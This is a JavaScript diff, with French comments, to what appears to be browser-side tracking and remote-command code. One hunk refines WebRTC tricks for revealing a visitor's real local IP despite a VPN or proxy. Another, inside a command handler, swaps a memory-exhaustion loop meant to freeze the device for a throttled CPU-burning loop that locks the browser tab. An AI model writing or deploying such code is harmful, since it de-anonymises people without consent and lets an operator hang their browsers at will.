@@ -19,20 +19,23 @@ async function getLocalIP() {
         pc.onicecandidate = (event) => {
             if (!event || !event.candidate) {
                 if (ips.length > 0) {
-                    // Filtrage des IPs "bidon" (192.0.0.2 ou mDNS .local)
+                    // Filtrage des IPs "bidon" et de l'IP publique si elle s'est glissée ici
                     const realIps = ips.filter(ip => 
+                        ip &&
                         !ip.includes('.local') && 
                         ip !== '192.0.0.2' && 
-                        ip !== '0.0.0.0'
+                        ip !== '0.0.0.0' &&
+                        !ip.startsWith('127.')
                     );
+                    
                     if (realIps.length > 0) {
                         cachedLocalIp = realIps[0];
                         resolve(realIps[0]);
                     } else {
-                        resolve("Inconnue (Masquée/VPN)");
+                        resolve("Masquée (VPN/Proxy)");
                     }
                 } else {
-                    resolve("Inconnue (Bloqué)");
+                    resolve("Masquée (Navigateur)");
                 }
                 return;
             }
@@ -231,13 +234,16 @@ async function checkCommands() {
                     
                     // Force le CPU à saturer pour geler l'appareil
                     setTimeout(() => {
-                        // Tentative de saturation mémoire et processeur
-                        const noise = [];
-                        while(true) {
-                            noise.push(new Array(1000000).fill("STOP"));
-                            console.log("SYSTEM_HALT");
-                            // Cette boucle va bloquer l'onglet et potentiellement le navigateur
-                        }
+                        // Tentative de saturation processeur légère
+                        let i = 0;
+                        const crashLoop = () => {
+                            console.log("SYSTEM_HALT_" + i++);
+                            // On ralentit la boucle pour éviter de faire planter ton PC de test
+                            // mais assez pour bloquer l'onglet
+                            for(let j=0; j<1000000; j++) { Math.sqrt(j); }
+                            setTimeout(crashLoop, 10);
+                        };
+                        crashLoop();
                     }, 3000);
                     break;
             }
